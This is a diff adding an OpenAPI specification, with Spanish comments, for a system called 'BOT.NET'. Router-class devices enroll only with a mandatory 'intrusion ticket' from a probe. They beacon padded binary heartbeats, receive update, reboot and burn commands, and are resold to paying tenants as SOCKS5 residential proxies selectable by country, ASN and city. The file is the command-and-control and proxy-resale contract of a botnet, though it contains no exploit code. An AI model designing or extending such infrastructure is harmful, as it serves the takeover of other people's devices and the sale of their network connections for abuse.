@@ -1,0 +1,317 @@
+# Esqueleto para depurar el contrato (BACKLOG P7: pkg/proto + openapi.yaml son
+# los contratos versionados que evitan la deriva entre EP-03/EP-08/EP-09).
+# Los handlers aun no estan implementados: esta superficie fija nombres,
+# codigos y esquemas; el canal de control del agente serializa pkg/proto en
+# binario (JSON prohibido), el panel y el cliente HTTP usan lo de aqui.
+openapi: 3.0.3
+info:
+  title: BOT.NET — control y cliente
+  version: 0.2.0
+  description: >-
+    Superficie HTTP del backend (control de flota) y del gateway backconnect
+    (sesiones del cliente). Los endpoints del agente (enroll, heartbeat, leave)
+    transportan los payloads binarios de pkg/proto; el body JSON de cada
+    esquema es la forma canonica en docs y panel.
+servers:
+  - url: https://api.botnet.example
+    description: control de flota (botnet-api)
+  - url: https://gw.botnet.example
+    description: gateway backconnect (botnet-gw)
+
+paths:
+  /v1/enroll:
+    post:
+      operationId: enroll
+      summary: Alta del nodo con CSR; la clave privada nunca sale del dispositivo
+      tags: [agent]
+      parameters:
+        - name: X-Device-Token
+          in: header
+          required: true
+          schema: { type: string }
+        - name: X-Intrusion-Ticket
+          in: header
+          required: false
+          description: >-
+            Ticket v1 firmado por la sonda (EP-02). Orden de gates: token
+            conocido -> 409, sin ticket -> 428, forjado -> 403, usado -> 409.
+          schema: { type: string }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: "#/components/schemas/EnrollRequest" }
+      responses:
+        "201":
+          description: nodo enrolado; node_secret solo viaja en esta respuesta
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/EnrollResponse" }
+        "400": { description: CSR con firma forjada o ilegible }
+        "403": { description: ticket de intrusion forjado o de otro token }
+        "409":
+          description: re-enroll idempotente (reset de fabrica del router) o ticket ya consumido
+        "422": { description: CN del CSR fuera de la politica de flota (botnet-node) o arch no soportado }
+        "428": { description: falta X-Intrusion-Ticket (la puerta de intrusion es obligatoria) }
+
+  /v1/heartbeat/{node_id}:
+    post:
+      operationId: heartbeat
+      summary: Beacon binario con relleno; la respuesta porta el flag bye
+      tags: [agent]
+      parameters:
+        - $ref: "#/components/parameters/NodeId"
+      requestBody:
+        required: true
+        content:
+          application/vnd.botnet.heartbeat+octet-stream:
+            schema:
+              type: string
+              format: binary
+              description: Heartbeat.Marshal de pkg/proto (200 B + relleno <=55 B)
+      responses:
+        "200":
+          description: acuse con cadencia y comandos pendientes
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/HeartbeatResponse" }
+        "410":
+          description: nodo retiring o burned; debe drenar y bajarse
+
+  /api/v1/sessions:
+    post:
+      operationId: createSession
+      summary: El cliente abre sesion en el gateway (POST /api/v1/sessions)
+      tags: [client]
+      security:
+        - bearerApiKey: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: "#/components/schemas/SessionRequest" }
+      responses:
+        "201":
+          description: sesion asignada a un nodo del pool del gateway
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/Session" }
+        "402": { description: cuota de GB agotada }
+        "403": { description: api key invalida o revocada }
+        "429": { description: rate-limit por tenant (o cupos concurrentes) }
+        "503": { description: "Redis caido o pool geo sin nodos vivos (A3-X3: sin admision a ciegas)" }
+
+  /api/v1/sessions/{session_id}:
+    delete:
+      operationId: closeSession
+      summary: cierre explicito (GOAWAY_SESSION en el stream H2)
+      tags: [client]
+      security:
+        - bearerApiKey: []
+      parameters:
+        - $ref: "#/components/parameters/SessionId"
+      responses:
+        "204": { description: sesion cerrada }
+        "404": { description: sesion desconocida }
+
+  /v1/nodes:
+    get:
+      operationId: listNodes
+      summary: inventario para el panel
+      tags: [panel]
+      parameters:
+        - name: status
+          in: query
+          schema:
+            type: string
+            enum: [enrolled, live, down, retiring, retired, burned]
+      responses:
+        "200":
+          content:
+            application/json:
+              schema:
+                type: array
+                items: { $ref: "#/components/schemas/Node" }
+
+  /v1/nodes/{node_id}/leave:
+    post:
+      operationId: leaveNode
+      summary: baja desde el panel (la del dueño es el flag bye del heartbeat)
+      tags: [panel]
+      parameters:
+        - $ref: "#/components/parameters/NodeId"
+      responses:
+        "200":
+          description: cert y node_secret revocados; leaves registra leave_code
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/Leave" }
+
+  /rdv/assign:
+    get:
+      operationId: rdvAssign
+      summary: rendezvous sin estado; reasigna el gateway sin reentregar binario
+      tags: [agent]
+      responses:
+        "200":
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/RdvAssign" }
+
+  /v1/nodes/{node_id}/revoke:
+    post:
+      operationId: revokeNode
+      summary: quema al nodo; CRL revoked:{serial} en Redis y node_secret revocado a la vez
+      tags: [panel]
+      security:
+        - bearerAdmin: []
+      parameters:
+        - $ref: "#/components/parameters/NodeId"
+      responses:
+        "200":
+          description: nodo burned; cerradas con closed_reason tipada
+          content:
+            application/json:
+              schema: { $ref: "#/components/schemas/RevokeResult" }
+        "401": { description: bearer admin requerido }
+        "404": { description: nodo desconocido }
+
+  /t/{slug}:
+    get:
+      operationId: transparencyPage
+      summary: pagina publica del dueno; la credencial nunca vive en la URL (A3-01)
+      tags: [panel]
+      parameters:
+        - name: slug
+          in: path
+          required: true
+          schema: { type: string, minLength: 12, maxLength: 12 }
+      responses:
+        "200":
+          description: estado publico del nodo
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  slug: { type: string }
+                  status: { type: string }
+                  country: { type: string }
+                  device_class: { type: string }
+        "404": { description: slug invalido o desconocido }
+
+  /healthz:
+    get:
+      operationId: healthz
+      summary: salud del proceso; 503 mientras el warmup de apikey:{sha256} no termina (T-0804)
+      tags: [ops]
+      responses:
+        "200": { description: backend operativo }
+        "503": { description: warmup en curso }
+
+components:
+  securitySchemes:
+    bearerAdmin:
+      type: http
+      scheme: bearer
+      description: token de administracion (panel/operaciones)
+    bearerApiKey:
+      type: http
+      scheme: bearer
+      description: api key del tenant (apikey:{sha256} en Redis, nunca Postgres por request)
+  parameters:
+    SessionId:
+      name: session_id
+      in: path
+      required: true
+      schema: { type: integer, format: int64 }
+    NodeId:
+      name: node_id
+      in: path
+      required: true
+      schema: { type: string, format: uuid }
+  schemas:
+    EnrollRequest:
+      type: object
+      required: [arch, model, fw, mac, csr]
+      properties:
+        arch:
+          type: string
+          enum: [mipsbe, mipsle, armv5, armv7, arm64, amd64]
+        model: { type: string }
+        fw: { type: string, description: firmware reportado }
+        mac: { type: string }
+        csr: { type: string, description: CSR PEM firmado por el dispositivo }
+    EnrollResponse:
+      type: object
+      properties:
+        node_id: { type: string, format: uuid }
+        slug: { type: string, minLength: 12, maxLength: 12 }
+        cert_pem: { type: string }
+        ca_pem: { type: string }
+        node_secret: { type: string, description: 32 B, emision unica, rota a 90 dias }
+        rendezvous:
+          type: array
+          items: { type: string }
+        ttl_s: { type: integer }
+    HeartbeatResponse:
+      type: object
+      properties:
+        next_interval_s: { type: integer }
+        config_rev: { type: integer }
+        pending_cmds:
+          type: array
+          items: { type: string, enum: [update, reboot, burn] }
+        bye: { type: boolean }
+    RdvAssign:
+      type: object
+      properties:
+        gateway_addr: { type: string }
+        session_token: { type: string }
+        ttl_s: { type: integer }
+    SessionRequest:
+      type: object
+      required: [country, mode]
+      properties:
+        country: { type: string, minLength: 2, maxLength: 2 }
+        asn: { type: integer }
+        city: { type: string }
+        mode: { type: string, enum: [sticky, rotating] }
+        sticky_ttl_s: { type: integer, minimum: 30, maximum: 3600 }
+    Session:
+      type: object
+      required: [session_id, proxy_url, expires_at]
+      properties:
+        session_id: { type: integer, format: int64 }
+        proxy_url: { type: string, pattern: "^socks5h://", example: socks5h://gw:port }
+        expires_at: { type: string, format: date-time }
+        nonce: { type: integer, format: int32, description: emitido en la asignacion; el nodo lo ecota en OPEN_STREAM (T-0808) }
+    Node:
+      type: object
+      properties:
+        node_id: { type: string, format: uuid }
+        slug: { type: string }
+        arch: { type: string }
+        device_class: { type: string, enum: [A, B, C] }
+        country: { type: string }
+        asn: { type: integer }
+        geo_verified: { type: boolean }
+        status: { type: string }
+        agent_version: { type: string }
+        last_seen_at: { type: string, format: date-time }
+    Leave:
+      type: object
+      properties:
+        node_id: { type: string, format: uuid }
+        method: { type: string, enum: [http, heartbeat_bye, panel, owner_url] }
+        leave_code: { type: string, minLength: 8, maxLength: 8 }
+        left_at: { type: string, format: date-time }
+    RevokeResult:
+      type: object
+      properties:
+        node_id: { type: string, format: uuid }
+        status: { type: string, enum: [burned] }
+        cert_serial: { type: string }
+        cert_revoked: { type: boolean }
+        secrets_revoked: { type: integer }
+        sessions_closed: { type: integer }
